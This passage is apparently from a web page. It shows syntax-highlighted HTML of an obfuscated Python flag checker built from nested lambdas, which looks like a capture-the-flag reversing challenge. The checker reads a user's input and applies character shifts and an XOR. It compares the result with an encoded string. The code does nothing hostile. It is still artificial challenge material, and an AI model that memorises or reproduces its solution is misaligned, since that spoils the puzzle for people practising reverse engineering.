style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">import\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> sys\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">sys\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">setrecursionlimit\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">10000000\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _0\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">: \u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">_0\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#C5E478\">input\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _1\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: (\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _2\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: \u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">_2\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">Enter the flag: \u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _3\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: (\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _4\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: \u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">_4\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">_1\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">_3\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">))\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _5\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: (\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _6\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: \u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">_6\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">''\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">.join\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _7\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: (\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _8\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: \u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">_8\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _9\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: \u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">_7\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#C5E478\">chr\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#C5E478\">ord\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">c\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> +\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 12\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\"> for\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\"> c \u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">in\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\"> _9)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">))\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _10\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: (\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _11\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: \u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">_11\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">''\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">.join\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _12\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: (\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _13\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: \u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">_13\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#C5E478\">chr\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#C5E478\">ord\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">c\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> -\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 3\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\"> for\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\"> c \u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">in\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\"> _10\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">_5\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _14\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: (\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _15\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: \u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">_15\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">_12\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">_14\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">))\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _16\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: (\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _17\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: \u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">_17\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">''\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">.join\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _18\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: (\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _19\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: \u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">_19\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _20\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: \u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">_18\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#C5E478\">chr\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">123\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> ^\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#C5E478\"> ord\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">c\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">))\u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\"> for\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\"> c \u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">in\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\"> _20)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">))\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _21\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: (\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _22\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: \u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">_22\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">''\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">.join\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _23\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: (\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _24\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: \u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">_24\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">_21\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">c\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\"> for\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\"> c \u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">in\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\"> _16)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _25\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: (\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _26\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: \u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">_26\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">_23\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">_25\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">))\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _27\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: (\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _28\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: \u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">_28\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">16_10_13_x_6t_4_1o_9_1j_7_9_1j_1o_3_6_c_1o_6r\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _29\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: (\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _30\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: \u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">_30\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">''\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">.join\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _31\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: (\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _32\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: \u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">_32\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#C5E478\">chr\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#C5E478\">int\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">c\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D9F5DD\">,\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">36\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> +\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 10\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\"> for\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\"> c \u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">in\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\"> _29.\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">split\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">_\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _33\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: (\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _34\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: \u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">_34\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">_31\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">_33\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">))\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _35\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: (\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _36\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: \u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">_36\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _37\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _38\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: _37 \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">==\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\"> _38\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _39\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: (\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _40\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: \u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">_40\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan 